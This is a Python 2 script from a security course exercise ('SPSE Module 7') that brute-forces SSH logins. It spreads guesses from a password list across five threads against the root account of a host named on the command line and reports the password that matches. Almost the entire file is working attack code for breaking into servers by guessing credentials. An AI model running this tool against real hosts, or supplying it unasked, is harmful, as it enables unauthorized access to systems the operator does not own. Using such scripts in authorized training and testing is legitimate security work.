#!/usr/bin/env python
import paramiko
import sys
import threading
import Queue
'''
SPSE Module 7. Lesson 2. Exercise 1.
SSH Dictionary Attack using paramiko!
'''
queue = Queue.Queue()
found = 0

def usage():
  print """paramiko_ssh_bruteforce.py Host dictionary_file
        This script will try to bruteforce a SSH service using a
        dcitionary and the root userid"""

def get_passwd_list(dictionary):
  # Function to read the contents of a file and return it as a
  # list (dictionary file)
  f_read = file(dictionary, 'r')
  passwd_list = f_read.readlines()
  return passwd_list

def set_found(var):
  global found
  found = var
def set_passwd_f(var):
  global passwd_f
  passwd_f = var

class ThreadSSH(threading.Thread):
  def __init__(self, queue):
    threading.Thread.__init__(self)
    self.queue = queue
  def run(self):
    # Sets up initial values (username, password)
    user = 'root'
    host = sys.argv[1]
    while found == 0:
      try :
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        passwd = self.queue.get()
        # Tries to connect using the passwords found in the list
        # If successful it will print the last passwrod tried and exit
        client.connect(host, username = user, password = passwd)
        print '[+] Password matched!: %s' %(passwd)
        set_passwd_f(passwd)
        set_found(1)
        self.queue.task_done()
        break
      except paramiko.ssh_exception.AuthenticationException:
        # If there is an Authentication Exception (Bad password).
        # It will print a notification
        print '[-] Failed Password: %s' %(passwd)
      except AttributeError:
        print 'Password not found in dictionary file'
        self.queue.task_done()
      except Exception as e:
        # In any other case (timeout, server closed connection) it will
        # restart the client and continue the procedure
        client = paramiko.SSHClient()
        client.load_system_host_keys()
      finally:
        # In either case it will close the connection at the end (very polite)
        client.close()
        self.queue.task_done()
    client.close()
    self.queue.task_done()
    return 1

def main():
  if len(sys.argv) < 3:
    usage()
  else:
    dictionary = sys.argv[2]
    passwd_list = get_passwd_list(dictionary)
    set_found(0)
    set_passwd_f('')
    for passwd in passwd_list:
      passwd = passwd.replace('\n', '')
      queue.put(passwd)
    for i in range(5):
      t = ThreadSSH(queue)
      t.setDaemon(True)
      t.start()
    queue.join()
    print '[ Script Terminated ]'
    if found == 1:
      print '>>> Password matched: %s' %(passwd_f)
    else:
      print '<<< Passwd not found'

if __name__ == '__main__':
  main()
